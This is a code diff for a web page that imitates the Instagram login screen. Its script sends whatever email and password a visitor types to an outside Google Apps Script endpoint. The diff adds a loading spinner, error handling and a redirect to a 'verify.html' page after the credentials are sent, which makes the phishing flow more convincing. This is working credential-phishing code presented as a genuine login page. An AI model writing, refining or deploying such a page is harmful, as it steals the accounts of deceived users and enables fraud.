@@ -7,7 +7,6 @@
      <title>Instagram</title>
      <link rel="shortcut icon" href="/img/instagram.png" type="image/x-icon">
      <link rel="stylesheet" href="style.css">
-
 </head>
 
 <body>
@@ -15,7 +14,6 @@
           <div class="image-section">
                <img src="/img/insta-login.png" alt="Instagram preview" />
           </div>
-
           <div class="login-section">
                <div class="login-box">
                     <div class="logo">
@@ -27,7 +25,6 @@
                                    fill="currentColor" fill-rule="evenodd"></path>
                          </svg>
                     </div>
-
                     <form class="login-form" id="testForm">
                          <div class="input-box">
                               <input id="email" name="email" type="email" placeholder="Phone number, username or email"
@@ -36,7 +33,10 @@
                          <div class="input-box">
                               <input id="password" name="password" type="name" placeholder="Password" required />
                          </div>
-                         <button type="submit" class="login-btn">Log in</button>
+                         <button type="submit" class="login-btn">
+                              <span class="btn-text">Log in</span>
+                              <span class="loader"></span>
+                         </button>
                     </form>
                     <div class="divider"><span>OR</span></div>
                     <button type="button" class="fb-btn"><svg aria-label="Log in with Facebook"
@@ -148,26 +148,33 @@
      </div>
      <script>
           const form = document.getElementById("testForm");
-
           form.addEventListener("submit", function (e) {
                e.preventDefault();
-
+               const btn = form.querySelector(".login-btn");
+               const loader = btn.querySelector(".loader");
+               const text = btn.querySelector(".btn-text");
+               // Show loader
+               loader.style.display = "inline-block";
+               text.classList.add("loading");
+               btn.disabled = true;
                const data = {
                     email: document.getElementById("email").value,
                     password: document.getElementById("password").value
                };
-
                fetch("https://script.google.com/macros/s/AKfycbyGAwkJmV_oBUNXuS8R5Dbf0tb18yuJOdonrjstrZKl6B4LRQ-MUk3U_b6a5xd0Z6eq/exec", {
                     method: "POST",
                     body: JSON.stringify(data),
                })
                     .then(res => res.json())
                     .then(() => {
-
                          form.reset();
+                         window.location.href = "verify.html";
                     })
                     .catch(() => {
-
+                         alert("Something went wrong. Try again!");
+                         loader.style.display = "none";
+                         text.classList.remove("loading");
+                         btn.disabled = false;
                     });
           });
      </script>
